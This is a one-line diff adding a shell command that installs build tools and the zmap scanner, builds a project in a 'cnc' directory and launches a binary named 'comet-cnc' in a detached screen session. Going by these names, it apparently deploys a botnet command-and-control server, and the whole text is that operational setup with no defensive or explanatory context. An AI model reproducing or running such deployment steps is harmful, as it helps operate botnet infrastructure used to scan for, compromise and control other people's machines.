@@ -1,0 +1,1 @@
+apt-get update && apt-get upgrade -y;apt-get install -y apache2 python3 python python3-pip golang-go screen gcc g++ nload zmap && cd cnc && bash build.bash && screen -S cnc ./comet-cnc
